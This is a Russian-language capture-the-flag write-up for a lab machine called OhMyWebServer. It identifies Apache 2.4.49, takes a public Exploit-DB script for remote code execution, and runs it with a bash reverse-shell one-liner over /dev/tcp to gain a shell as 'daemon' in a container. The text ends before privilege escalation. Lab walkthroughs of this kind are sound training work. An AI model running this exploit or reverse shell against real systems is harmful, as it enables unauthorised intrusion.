# OhMyWebServer WriteUp (Medium)✅

Перейдя по ip адресу мы попадаем на страницу какого-то сайта, связаного с консалтинговыми услугами

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Просканировав порты, мы модем узнать что на 80 порте находится **Apache-HTTP сервер**, при чем версия Apache - **2.4.49**

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Зайдя на сайт exploit-db.com и прогуглив данную версию ПО Apache, мы можем найти эксплойт, с помощью которого сможем удаленно выполнять код

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Скачиваем данный экспойт и тестируем его работу

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption><p>Перед использованием скрипта я создал текстовый файл <strong>ip.txt</strong>, куда вписал ip адрес машины 📌</p></figcaption></figure>

Если мы можем с помощью данного эксплойта выполнять какие-либо команды, то, следовательно, вместо команды ls можно вписать bash\_reverse\_shell и получить оболочку нашей машины

Подключив слушатель заранее, выполняем команду

`./50383.sh ip.txt /bin/sh 'bash -c "bash -i >& /dev/tcp/10.17.5.130/5555 0>&1"'`

и получаем шелл от лица пользователя **daemon**

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>Судя по странному набору букв и цифр после имени пользователя, мы находимся в докере 📌</p></figcaption></figure>

Первый флаг, вероятнее всего, находится в папке root, но мы не имеем прав, чтобы в неё перейти, поэтому придётся выполнять эскалацию привилегий и получать root'a
